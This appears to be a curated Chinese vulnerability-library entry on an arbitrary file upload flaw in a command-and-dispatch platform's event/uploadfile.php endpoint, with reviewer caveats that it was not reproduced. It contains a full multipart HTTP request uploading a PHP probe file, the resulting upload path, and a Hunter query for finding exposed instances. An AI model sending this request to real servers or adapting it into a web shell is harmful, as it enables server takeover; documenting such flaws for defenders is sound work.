---
source: "wy876 漏洞文库"
title: "指挥调度平台PHP版（科立讯归属待核） event uploadfile.php上传"
product: "指挥调度平台PHP版（科立讯归属待核）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，PHP执行目录"
prerequisites: "未说明"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/llu0mvvzuhvpu9ag"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E8%9E%8D%E5%90%88%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E5%B9%B3%E5%8F%B0/%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E5%B9%B3%E5%8F%B0event_uploadfile%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "web.body="
hunter: "web.body=\"app/structure/departments.php\""
id: "vw-c2a662826de3210eb6a9fb17"
entity_id: "ve-c2a662826de3210eb6a9fb17"
schema_version: "1"
---

# 指挥调度平台PHP版（科立讯归属待核） event uploadfile.php上传

## 条目说明

- 对象与具体问题：指挥调度平台PHP版（科立讯归属待核）；event uploadfile.php上传
- 版本、配置及部署条件：版本未知，PHP执行目录
- 认证与权限前提：未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 同534上传族但路由、字段uploadfile、UUID目录不同，不直接合成重复稿
- 固定UUID路径未展示返回提取，乘法PHP无执行结果；静态Content-Length需重算
- Hunter错入fofa，营销/HTML噪声，缺版本/修复

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
指挥调度管理平台是一个专业针对通信行业的管理平台。该产品旨在提供高效的指挥调度喝管理解决方案，以帮助通信运营商或相关机构实现更好的运营效率和服务质量。该平台提供强大的指挥调度功能，可以实时监控和管理通信网络设备、维护人员和工作任务等。用户可以通过该平台发送指令、调度人员、分配任务。指挥调度平台event_uploadfile存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

## 二、影响版本
+ 指挥调度平台

## 三、资产测绘
+ hunter`web.body="app/structure/departments.php"`
+ 特征


## 四、漏洞复现
```http
POST /api/client/event/uploadfile.php HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36
Connection: close
Content-Length: 179
Content-Type: multipart/form-data; boundary=htu3qcyui73l2jtyqwnk
Accept-Encoding: gzip, deflate

--htu3qcyui73l2jtyqwnk
Content-Disposition: form-data; name="uploadfile"; filename="stc.php"
Content-Type: image/jpeg

<?php echo 111*111;?>
--htu3qcyui73l2jtyqwnk--

```

> 请求长度说明：原资料 Content-Length 为 179；保留原始标头；其数值未据实际请求体重新计算或验证。


上传文件位置

```plain
/upload/event/ccc78e2b-5e61-49c0-9050-3a29687b2e81.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/llu0mvvzuhvpu9ag>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
